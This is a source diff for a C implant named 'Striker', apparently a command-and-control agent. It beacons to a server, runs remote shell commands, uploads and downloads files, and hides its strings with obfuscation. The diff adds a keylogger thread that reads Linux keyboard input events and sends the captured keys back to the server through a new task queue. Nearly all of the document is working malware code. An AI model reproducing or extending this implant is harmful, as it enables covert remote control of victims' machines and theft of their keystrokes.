@@ -9,14 +9,18 @@
 
 // Set to non-zero value for debug outputs.
 #define STRIKER_DEBUG 1
+// Max task result size in bytes
+#define MAX_RES_SIZE (sizeof(char) * 102400)
+// Max number of tasks to queue.
+#define MAX_TASKS_QUEUE 100
+// Max number of keystrokes to collect by the key logger
+#define MAX_KEYSTROKES 30
 
 #define URL_SIZE (sizeof(char) * 256)
 char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
 char AUTH_KEY[sizeof(char) * 32] = "[STRIKER_AUTH_KEY]"; // A marker for the authentication key to use for connecting.
 char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]"; // A marker for the key to use for obfuscating strings.
 
-// Max task result size in bytes
-#define MAX_RES_SIZE (sizeof(char) * 102400)
 
 char *obfs_decode(char *str){
 
@@ -85,20 +89,6 @@ cJSON *sysinfo(){
   return info;
 }
 
-task *parse_task(cJSON *json){
-
-  char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
-  for (int i = 0; i < 3; i++)
-    obfs_decode(strs[i]);
-  task *t = malloc(sizeof(task));
-  t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[0]));
-  t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
-  t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
-  t->completed = 0;
-  t->result = NULL;
-  return t;
-}
-
 short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){
 
   CURL *curl = curl_easy_init();
@@ -153,6 +143,67 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
   return 1;
 }
 
+void *keymon(void *ptr){
+
+  char strs[][100] = {"[OBFS_ENC]duration", "[OBFS_ENC]/dev/input/by-path/platform-i8042-serio-0-event-kbd", "[OBFS_ENC]Error opening keyboard file!", "[OBFS_ENC] No keys logged!", "[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]loggedKeys"};
+  for (int i = 0; i < 7; i++)
+    obfs_decode(strs[i]);
+  task *tsk = (task *)ptr;
+  printf("uid: %s\n", tsk->uid);
+  cJSON *data = tsk->data;
+  unsigned long duration = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
+  unsigned char *keys = malloc(sizeof(unsigned char) * MAX_KEYSTROKES);
+  size_t count = 0;
+  cJSON *result;
+  buffer *result_buff = create_buffer(0);
+  int kb = open(strs[1], O_RDONLY);
+  if (kb == -1){
+    buffer_strcpy(result_buff, strs[2]);
+    goto complete;
+  }
+  struct input_event e;
+  while (count < MAX_KEYSTROKES){
+    read(kb, &e, sizeof(e));
+    if (!(e.type == EV_KEY && e.value == 0))
+      continue;
+    keys[count] = e.code;
+    count++;
+  }
+  close(kb);
+
+  complete:
+    result = cJSON_CreateObject();
+    cJSON_AddItemToObject(result, strs[4], cJSON_CreateString(tsk->uid));
+    if (count > 0){
+      cJSON *keys_logged = cJSON_CreateArray();
+      for (int i = 0; i < count; i++)
+        cJSON_AddItemToArray(keys_logged, cJSON_CreateNumber(keys[i]));
+      cJSON_AddItemToObject(result, strs[6], keys_logged);
+    }else{
+      char *res = buffer_to_string(result_buff);
+      cJSON_AddItemToObject(result, strs[5], cJSON_CreateString(res));
+    }
+    tsk->result = result;
+    free_buffer(result_buff);
+    tsk->completed = 1;
+    pthread_exit(NULL);
+}
+
+task *parse_task(cJSON *json){
+
+  char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
+  for (int i = 0; i < 3; i++)
+    obfs_decode(strs[i]);
+  task *t = malloc(sizeof(task));
+  t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[0]));
+  t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
+  t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
+  t->queued = 0;
+  t->completed = 0;
+  t->result = NULL;
+  return t;
+}
+
 void execute_task(session *striker, task *tsk){
 
   if (STRIKER_DEBUG){
@@ -162,8 +213,8 @@ void execute_task(session *striker, task *tsk){
   cJSON *data = tsk->data;
   cJSON *result = cJSON_CreateObject();
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir"};
-  for (int i = 0; i < 4; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon"};
+  for (int i = 0; i < 5; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -204,7 +255,7 @@ void execute_task(session *striker, task *tsk){
     fclose(rfo);
     free(url);
   }else if (!strcmp(tsk->type, cmd_strs[2])){ // Download a file from the server.
-    char strs[][40] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s"};
+    char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s"};
     for (int i = 0; i < 4; i++)
       obfs_decode(strs[i]);
     char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
@@ -221,7 +272,7 @@ void execute_task(session *striker, task *tsk){
     fclose(wfo);
     free(url);
     free(loc);
-  }else if (!strcmp(tsk->type, cmd_strs[3])){
+  }else if (!strcmp(tsk->type, cmd_strs[3])){ // Change write directory.
     char strs[][40] = {"[OBFS_ENC]dir", "[OBFS_ENC]Changed write directory!"};
     for (int i = 0; i < 2; i++)
       obfs_decode(strs[i]);
@@ -233,22 +284,33 @@ void execute_task(session *striker, task *tsk){
     }
     strncpy(striker->write_dir, dir, PATH_MAX);
     buffer_strcpy(result_buff, strs[1]);
+  }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
+    char msg[] = "[OBFS_ENC]Error starting keymon thread!";
+    obfs_decode(msg);
+    pthread_t t;
+    int err = pthread_create(&t, NULL, keymon, (void *)tsk);
+    if (err)
+      buffer_strcpy(result_buff, msg);
+    tsk->queued = 1;
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
   }
 
   char strs[][40] = {"[OBFS_ENC][+] Task completed: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]result"};
+
   complete:
     for (int i = 0; i < 3; i++)
       obfs_decode(strs[i]);
-    if (STRIKER_DEBUG)
-      printf(strs[0], tsk->uid);
-    tsk->completed = 1;
-    char *res = buffer_to_string(result_buff);
-    cJSON_AddItemToObject(result, strs[1], cJSON_CreateString(tsk->uid));
-    cJSON_AddItemToObject(result, strs[2], cJSON_CreateString(res));
-    tsk->result = result;
+    if (!tsk->queued){    
+      if (STRIKER_DEBUG)
+        printf(strs[0], tsk->uid);    
+      char *res = buffer_to_string(result_buff);
+      cJSON_AddItemToObject(result, strs[1], cJSON_CreateString(tsk->uid));
+      cJSON_AddItemToObject(result, strs[2], cJSON_CreateString(res));
+      tsk->result = result;
+      tsk->completed = 1;
+    }
     free_buffer(result_buff);
 }
 
@@ -261,8 +323,8 @@ void start_session(){
     "[OBFS_ENC]/tmp", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
     "[OBFS_ENC]/agent/init", "[OBFS_ENC][-] Error calling home: %s\n",
     "[OBFS_ENC][-] Error parsing config: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]delay",
-    "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC][+] Task results: %s\n"};
-  for (int i = 0; i < 10; i++)
+    "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC][+] Task results: %s\n", "[OBFS_ENC]Queued task completed: %s\n"};
+  for (int i = 0; i < 11; i++)
     obfs_decode(strs[i]);
   // Default session setup.
   session *striker = malloc(sizeof(session));
@@ -307,10 +369,13 @@ void start_session(){
   striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, strs[7]));
   char *tasksURL = malloc(URL_SIZE);
   snprintf(tasksURL, URL_SIZE, strs[8], striker->uid);
-  printf("%s\n", cJSON_PrintUnformatted(config));
+  queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
+  if (STRIKER_DEBUG)
+    printf("%s\n", cJSON_PrintUnformatted(config));
   while (1){
     resize_buffer(body, 0);
-    sleep(striker->delay);
+    // sleep(striker->delay);
+    sleep(1);
     // Fetch tasks.
     curl = init_curl(tasksURL, body);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
@@ -330,8 +395,23 @@ void start_session(){
       if (!tsk)
         continue;
       execute_task(striker, tsk);
-      if (tsk->completed && tsk->result != NULL)
+      if (tsk->completed && tsk->result != NULL){ // The tasks has been completed.
         cJSON_AddItemToArray(results, tsk->result);
+      }else if(tsk->queued && (!queue_full(tasks_queue))){ // Task has been queued.
+        queue_put(tasks_queue, tsk);
+      }
+    }
+    // Check if queued tasks are completed.
+    queue_seek(tasks_queue, 0);
+    for (int i = 0; !queue_exhausted(tasks_queue); i++){
+      task *tsk = queue_get(tasks_queue);
+      if (tsk->completed){
+        if (STRIKER_DEBUG)
+          printf(strs[10], tsk->uid);
+        queue_remove(tasks_queue, i);
+        cJSON_AddItemToArray(results, tsk->result);
+        i--;
+      }
     }
     // Send results.
     if (cJSON_GetArraySize(results) > 0){
@@ -356,7 +436,7 @@ void start_session(){
     }
     // Cleanup.
     cJSON_Delete(results);
-    cJSON_Delete(tasksJSON);
+    // cJSON_Delete(tasksJSON);
   }
 
   free(tasksURL);
